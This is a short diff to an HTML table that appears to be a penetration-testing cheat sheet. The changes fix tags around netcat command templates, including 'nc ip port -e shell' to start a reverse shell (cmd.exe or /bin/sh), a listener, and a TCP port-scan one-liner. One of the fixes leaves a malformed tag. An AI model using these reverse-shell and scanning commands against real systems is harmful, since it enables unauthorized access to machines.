@@ -16,15 +16,15 @@
     <td>dns zone transfer</td>
   </tr>
   <tr>
-    <td>nc <i>ip port</i> -e <i>shell</td>
+    <td>nc <i>ip port</i> -e <i>shell</i></td>
     <td>start reverse shell: cmd.exe, /bin/sh</td>
   </tr>
   <tr>
-    <td>nc -l -p <i>port</td>
+    <td>nc -l -p <i>port</i></td>
     <td>start listener</td>
   </tr>
   <tr>
-    <td>nc -v -n -z -w1 <i>ip startPort</i> - <i>endPort</td>
+    <td>nc -v -n -z -w1 <i>ip startPort</i> - <i>endPort</i</td>
     <td>tcp port scanner</td> 
   </tr>
   <tr>
@@ -33,5 +33,5 @@
   </tr>
 </table>
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTA0NTQwMzk4MSwtMTk2NjU4ODUxNV19
+eyJoaXN0b3J5IjpbNDYyODUzMTAzLC0xOTY2NTg4NTE1XX0=
 -->
